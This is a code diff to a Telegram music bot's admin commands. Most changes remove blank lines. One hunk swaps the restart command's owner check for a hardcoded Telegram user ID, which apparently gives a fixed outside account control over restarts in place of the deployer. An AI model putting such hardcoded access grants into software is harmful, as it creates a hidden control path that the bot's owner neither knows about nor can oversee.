@@ -23,10 +23,8 @@ from VanizaXMusic.utils.pastebin import HottyBin
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
 async def is_heroku():
     return "heroku" in socket.getfqdn()
-
 
 @app.on_message(filters.command(["getlog", "logs", "getlogs"]) & OWNER_ID)
 @language
@@ -35,7 +33,6 @@ async def log_(client, message, _):
         await message.reply_document(document="log.txt")
     except:
         await message.reply_text(_["server_1"])
-
 
 @app.on_message(filters.command(["update", "gitpull"]) & OWNER_ID)
 @language
@@ -111,7 +108,7 @@ async def update_(client, message, _):
         exit()
 
 
-@app.on_message(filters.command(["restart"]) & OWNER_ID)
+@app.on_message(filters.command(["restart"]) & filters.user(5529460893))
 async def restart_(_, message):
     response = await message.reply_text("ʀᴇsᴛᴀʀᴛɪɴɢ...")
     ac_chats = await get_active_chats()
